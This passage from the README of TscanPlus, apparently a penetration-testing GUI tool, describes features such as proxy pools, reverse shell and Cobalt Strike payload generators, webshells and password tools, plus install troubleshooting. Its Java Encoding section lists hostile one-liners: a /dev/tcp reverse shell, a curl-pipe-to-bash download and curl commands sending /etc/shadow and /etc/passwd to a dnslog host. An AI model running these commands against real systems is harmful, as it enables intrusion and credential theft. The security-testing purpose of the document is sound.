- Adding proxies
- Automatically crawling for proxies
- Switching proxy scenarios
- Proxy validation
- Proxy Listener management

When the **Proxy Listener** is enabled, it works with different proxy switching modes, polling, and cycling through all available proxies in the pool. These proxies can then be provided to TscanPlus or other external applications.

For detailed usage, you can refer to the documentation [【无影v2.6.5—代理池管理功能上线】](https://github.com/TideSec/TscanPlus/blob/main/%E6%97%A0%E5%BD%B1v2.6.5%E2%80%94%E4%BB%A3%E7%90%86%E6%B1%A0%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD%E4%B8%8A%E7%BA%BF.md)

<div align=center><img src=images/image-20241225095955306.png width=80% ></div>

#### **12. Red Team Commands**

TscanPlus includes commonly used Red Team commands, including:
- **26 types** of Windows internal network commands (credential gathering, persistence, lateral movement)
- **18 types** of Linux internal network commands
- **31 download commands**
- 85 reverse shell commands
- 21 MSF (Metasploit) generation commands
- CS (Cobalt Strike) evasion commands

These commands can be auto-generated based on shell type, operating system, and listener type.

---

##### **【Red Team Commands】**

- **Windows Internal Network**: Includes 26 types of commands for credential gathering, persistence, and lateral movement.
- **Linux Internal Network**: Includes 18 types of internal network commands.

<div align=center><img src=images/image-20231221142158055.png width=80% ></div>

---

##### **【Download Commands】**

TscanPlus has 31 built-in download commands that cover most of the methods used in internal network penetration testing. After configuring the URL address and target file name, the corresponding code can be automatically generated.

<div align=center><img src=images/image-20231221142332714.png width=80% ></div>

---

##### **【Webshell】**

TscanPlus includes a variety of basic one-liner web shells in different programming languages and some evasion web shells (e.g., IceScorpion, AntSword, Godzilla), for security personnel to refer to. These web shells can assist in penetration testing and web exploitation scenarios.

<div align=center><img src=images/image-20240830151318754.png width=80% ></div>

##### **【Java Encoding】**

Sometimes, using `Runtime.getRuntime().exec()` to execute a command payload can fail, especially when exploiting WebShells, deserialization vulnerabilities, or other attack vectors.

This failure often happens due to the way redirection and pipe characters are handled in the context of the process being launched. For example, `ls > dir_listing` should list the current directory’s contents into a file called `dir_listing` when executed in a shell. However, within the `exec()` function’s context, this command may be misinterpreted as a command to list the directory `>` and `dir_listing`.

In other cases, arguments containing spaces might be broken by the `StringTokenizer` class, which splits the string at spaces. For example, `ls "My Directory"` might get split and interpreted as `ls '"My' 'Directory"'`.

By utilizing **Base64 encoding**, the **Java Command Encoder** can help mitigate these issues. It allows for better handling of pipes and redirection by invoking Bash or PowerShell again and ensures that parameters with spaces are properly processed.

**Common Command List**:

```
bash -i >& /dev/tcp/127.0.0.1/6666 0>&1
ping `whoami`.key.dnslog.cn
curl http://www.google.com/bash.txt|bash
curl http://key.dnslog.cn/?r=`whoami`
curl http://key.dnslog.cn/?r=`cat /etc/shadow|base64`
curl http://key.dnslog.cn/?r=$(cat /etc/passwd|base64|tr '\n' '-')
curl http://www.google.com/key.txt
curl http://www.google.com/key.txt -O
curl http://www.google.com/key.txt -o key.txt
```

<div align=center><img src=images/image-20240111143548211.png width=80% ></div>

##### **【Reverse Shell】**

The Reverse Shell feature allows users to configure the target IP/Port, listener type, shell type, and whether to encode the command. Users can choose the desired command, and TscanPlus will automatically generate the corresponding reverse shell code. Common types of reverse shells include:
- **TCP Reverse Shell**
- **HTTP Reverse Shell**
- **DNS Reverse Shell**
- **PowerShell Reverse Shell**, etc.

This feature helps penetration testers establish a remote connection back to the attacker's machine for controlling the target system.

<div align=center><img src=images/image-20231221141826648.png width=80% ></div>

##### **【Cobalt Strike (CS) Payload】**

The CS (Cobalt Strike) payload feature allows users to input the CS Payload URL and automatically generate the corresponding code for Cobalt Strike. As a popular red team tool, Cobalt Strike supports various payload delivery methods, including reverse shell and Beacon. This feature helps generate code that meets the requirements for Cobalt Strike payload loading.

<div align=center><img src=images/image-20231221141838825.png width=80% ></div>

#### 13. Auxiliary Tools

TscanPlus also includes several useful auxiliary tools that help improve the efficiency and accuracy of penetration testing.

##### **【Asset Sorting】**

The Asset Sorting feature helps users extract and organize valuable information from large volumes of asset data. With a single click, users can quickly extract the main domain names, subdomains, IP addresses, URLs, and other data from assets. It also supports extracting results from Tscan/Fscan scans and offers two sorting modes: **Collapse Mode** and **C-Class Sorting**.

- **Collapse Mode**: This mode filters out assets with port numbers (e.g., `ip:port` or `domain:port`), leaving only subdomains and IP addresses that do not specify a port.
- **C-Class Sorting**: This mode categorizes IPs into C-Class networks, making it easier for users to group and manage IPs efficiently.

The Asset Sorting feature significantly simplifies the process of asset management and information extraction, enabling penetration testers to quickly identify potential attack targets.

<div align=center><img src=images/image-20240617181411005.png width=80% ></div>

##### **【Password Generation】**

TscanPlus offers three methods for generating passwords: **Social Engineering Dictionary Generation**, **Organizational Mode**, and **Enumeration Mode**. These methods allow users to generate more targeted dictionary files based on their specific needs.

<div align=center><img src=images/01.png width=80% ></div>

##### **【Password Query】**

TscanPlus includes a built-in database of **10,733 common default usernames and passwords** for various devices and products. Users can directly query and export these credentials for quick reference.

<div align=center><img src=images/02.png width=80% ></div>

##### **【Privilege Escalation Assistance】**

This feature queries unpatched vulnerabilities based on system information (`systeminfo`) and returns details about the vulnerabilities, including Microsoft vulnerability IDs, patch numbers, vulnerability descriptions, affected systems, and more.

<div align=center><img src=images/image-20231221142455293.png width=80% ></div>

##### **【Antivirus Software Query】**

Based on the `tasklist` information from Windows, TscanPlus matches running antivirus processes using a built-in set of **1,042 antivirus detection rules**. The tool returns details such as the process name, process ID, antivirus software name, and more.

<div align=center><img src=images/image-20231221142616501.png width=80% ></div>


#### 14. Other Features

##### **【Export Function】**

1. A new **Export to Excel** feature has been added across all modules. By default, the exported file will be saved in the program’s root directory.

2. In all modules, users can sort and filter the content of all columns.

3. In all modules, multiple items can be selected or all items can be selected for batch operations, such as running POC tests, password cracking, directory enumeration, etc.

4. During the execution of the software, all discovered assets and threats will be saved in real-time. The saved data will be stored in the `result.txt` file located in the program’s root directory.

<div align=center><img src=images/image-20240111144248390.png width=80% ></div>

<div align=center><img src=images/image-20240111144635519.png width=80% ></div>

##### **【Database Management】**

All data can be stored persistently and used across sessions. The default **database file** will be generated under the `config` folder.

<div align=center><img src=images/image-20240327165547238.png width=80% ></div>

##### **【Configuration Management】**

Configuration parameters for each function are written to configuration files. Once parameters are modified, executing the respective functionality once will save the changes to the configuration file, and there is no need to modify them again the next time.

<div align=center><img src=images/image-20240327165714901.png width=80% ></div>

Custom red team commands, online commands, default passwords, etc., can be added and saved to the configuration file.


<div align=center><img src=images/image-20240327165814782.png width=80% ></div>

##### **【Theme Settings】**

The system now includes a theme setting feature. By opening the "Advanced Configuration" on any page, users can configure the system theme and choose between dark or light modes. (This feature is based on the Wails framework, which works well on macOS, but there may be issues when applied on certain Windows systems.)

<div align=center><img src=images/image-20240327165922789.png width=80% ></div>

Comparison of dark and light themes on macOS.

<div align=center><img src=images/image-20240327172657687.png width=80% ></div>

##### **【Log Function】**

A logging feature has been added. The latest program logs are displayed in real-time on the right side of the About page. The log file is stored by default in the "Advanced Configuration" → "Export Directory" folder, and the file name is `TscanPlus-Result.txt`.

<div align=center><img src=images/image-20240830151748990.png width=80% ></div>

### Software Download

GitHub Download: [https://github.com/TideSec/TscanPlus/releases](https://github.com/TideSec/TscanPlus/releases)  
Knowledge Planet: QR code below (for more and updated versions)

Some features are still being improved (such as the subdomain module, custom POC functionality, etc.), and the source code is not yet available. Currently, the Windows/macOS/Linux versions of TscanPlus are packaged and available for download.

The versions compiled are all for the x64_AMD architecture. If you need the x86 or ARM versions, they can be downloaded from the Knowledge Planet.

**Future updates and bug feedback will be promptly shared on the Knowledge Planet.**

<div align=center><img src=images/zsxq.png width=50% ></div>


### Acknowledgments

During the development of this tool, many well-known Go detection tools and fingerprint recognition software were referenced. We would like to express our gratitude to the following contributors:

- YHY's **ChYing** project: [https://github.com/yhy0/ChYing](https://github.com/yhy0/ChYing)  
- qwtd's **Slack** project: [https://github.com/qiwentaidi/Slack](https://github.com/qiwentaidi/Slack)  
- Shadow1ng's **fscan** project: [https://github.com/shadow1ng/fscan](https://github.com/shadow1ng/fscan)  
- zhzyker's **dismap** project: [https://github.com/zhzyker/dismap](https://github.com/zhzyker/dismap)  
- **ServerScan** project: [https://github.com/Adminisme/ServerScan](https://github.com/Adminisme/ServerScan)

### FAQ

#### **1. Key Authentication Issues**

1.1. Key authentication requires an internet connection (to poc.tidesec.com) only during the initial verification. Once verified successfully, no further internet connection is needed for re-validation.  
1.2. Each key can only be used with one client. The authentication primarily relies on hardware identifiers such as network card serial numbers. Therefore, replacing hardware could result in authentication failure.  
1.3. The purpose of key authentication is to facilitate the use and collection of POCs in a mutually beneficial cycle. "From the public, for the public." We encourage those who have POCs to submit them.

#### **2. macOS Installation Issues**

You may encounter several issues when executing the tool on macOS, such as "xxx is damaged and cannot be opened," "Apple cannot verify if xxx contains malicious software," or "xxx cannot be opened because it comes from an unidentified developer." The following articles can resolve about 95% of these issues:

- [Fixing the "Application is damaged and cannot be opened" error on macOS](https://sysin.org/blog/macos-if-crashes-when-opening/)  

A common issue on macOS is the app crashing or quitting unexpectedly. To resolve this, execute the following command:

```bash
sudo xattr -r -d com.apple.quarantine TscanPlus_darwin_amd64_v1.0.app
```

If the problem persists, try this command:

```bash
sudo codesign --sign - --force --deep TscanPlus_darwin_amd64_v1.0.app
```

#### **3. Windows Dependency on WebView2 Environment**

**(1) System Lacks WebView2 Environment**

Programs packaged with Wails depend on [Microsoft WebView2](https://developer.microsoft.com/zh-cn/microsoft-edge/webview2/?form=MA13LH#download) when running on Windows.

By default, Windows 11 and Windows Server 2012 will have WebView2 installed, but some older machines (such as Windows Server 2008) may not. If the WebView2 environment is missing, the program will prompt you to download and install WebView2.

You can manually download WebView2 from here:  
[Microsoft WebView2 Download](https://developer.microsoft.com/zh-cn/microsoft-edge/webview2/?form=MA13LH#download)

 **(2) WebView2 Installed, But Error During Execution**

If you encounter the error message **"The WebView2 process crashed and the application needs to be restarted"** after execution:

<div align=center><img src=images/21.png width=50% ></div>

In this case, you need to uninstall the current WebView2 and then reinstall it. You can download the installer here:  
[Microsoft WebView2 Download](https://developer.microsoft.com/zh-cn/microsoft-edge/webview2/?form=MA13LH#download)

 **(3) Unable to Uninstall and Reinstall WebView2**

If WebView2 cannot be uninstalled, you can use a small tool called **【Windows11轻松设置](https://github.com/TideSec/TscanPlus/blob/main/soft/Windows11_Tools.7z)**.

<div align=center><img src=https://github.com/user-attachments/assets/3d950d77-a188-4bb2-b8e9-1b1f1acdb8d8 width=70% ></div>

<div align=center><img src=https://github.com/user-attachments/assets/5a4da4be-7d37-4c3b-af1e-193e43a74cad width=70% ></div>

Using this tool, you can completely uninstall WebView2 and then reinstall it.

 **(4) Still Cannot Open After Reinstallation**

If, after reinstalling WebView2, the program still fails to open with no error message, the issue could be a bug resulting from an interaction between WebView2, certain versions of Windows, and the Wails `go-webview2` library. To resolve this, we have packaged an improved version specifically addressing the WebView2 issue. Please try using this version.

<div align=center><img src=https://github.com/user-attachments/assets/15d0c7f2-76c1-4359-8556-8f5232158f2b width=70% ></div>

<div align=center><img src=https://github.com/user-attachments/assets/f5a0bd0a-2c26-45f9-96e0-4471b7e0db83 width=70% ></div>

####  **4. Linux Version Running Errors**

The Linux version (AMD64 and Arm64) is compiled based on Kali 2023/2024 and has been tested to be compatible with Kali 2023 and later versions, as well as Ubuntu 22.04.

**Additionally, the Linux version needs to be executed in a desktop environment. It cannot run in a remote SSH session.**

For systems earlier than Ubuntu 22.04 and some Kali 2024.03, the following errors may occur:

**(1) Error: `libc.so.6: version 'GLIBC_2.34' not found`**

In this case, you need to install the `libc6` library. You can refer to this guide: [CSDN Article on Installing GLIBC](https://blog.csdn.net/huazhang_001/article/details/128828999).

**(2) Error: `libwebkit2gtk-4.0.so.37: cannot open shared object file`**

In this case, you need to install the `libwebkit2gtk` library. On Ubuntu, try executing:

```bash
apt-get install libwebkit2gtk-4.0-dev
```

If you encounter an error:

```
apt install libwebkit2gtk-4.0-dev
Error: Unable to locate package libwebkit2gtk-4.0-dev
Error: Couldn't find any package by glob 'libwebkit2gtk-4.0-dev'
```

You need to edit the sources list by running:

```bash
vi /etc/apt/sources.list
```

In the `/etc/apt/sources.list` file, add the following line:

```
deb http://gb.archive.ubuntu.com/ubuntu jammy main
```

Then, run the following commands:

```bash
apt update
apt install libwebkit2gtk-4.0-dev
```

If you get an error like:

```
Warning: GPG error: http://gb.archive.ubuntu.com/ubuntu jammy InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 871920D1991BC93C
```

You need to execute:

```bash
apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 871920D1991BC93C
```

(Note: Replace the key if necessary.)

Then, run:

```bash
apt update
```

If running `apt install libwebkit2gtk-4.0-dev` results in an error like:

```
libturbojpeg0 : conflicts: libjpeg-turbo8 but 2.1.2-0ubuntu1 is to be installed
E: Error, pkgProblemResolver ::Resolve generated breaks, this may be caused by held packages.
```

You need to run the following commands:

```bash
apt-get remove libjpeg-turbo8
apt-get remove libturbojpeg0
```

After that, execute `apt install libwebkit2gtk-4.0-dev` again. Once the installation is successful, you should be able to open the program normally.

After successfully installing `libwebkit2gtk-4.0-dev`, run the command:

```bash
apt list | grep libwebkit2gtk
```

You should see that the `libwebkit2gtk-4.0-dev` library has been successfully installed.

<div align=center><img src=images/image-20241218143353349.png width=50% ></div>

However, library dependency issues in Linux can be tricky. It’s recommended to use Kali 2023 or later versions, as well as Ubuntu 22.04.

#### 5. Antivirus False Positives on Windows

The program is developed using Go, and the Windows version is packed with UPX. As a result, some antivirus software may flag it as a virus. If this happens, please perform a manual investigation and add an exception for the program.

#### 6. Unable to See the Top Tab Bar After Launch

A "Fullscreen" button has been added to the welcome page to make it easier for Windows users to maximize the application with a single click.

In some cases, after opening the program, users may only see the middle part of TscanPlus, and the top tab bar might not be visible. This issue is usually caused by low screen resolution or scaling settings. To resolve this, adjust the resolution to at least 1440x1080 and set the scaling to 100%.

#### 7. Reporting Bugs

For any other software bugs, please report them on the GitHub Issues page or the Knowledge Planet. These will be addressed and fixed in future updates.


### Star History

[![Star History Chart](https://api.star-history.com/svg?repos=TideSec/TscanPlus&type=Date)](https://star-history.com/#TideSec/TscanPlus&Date)

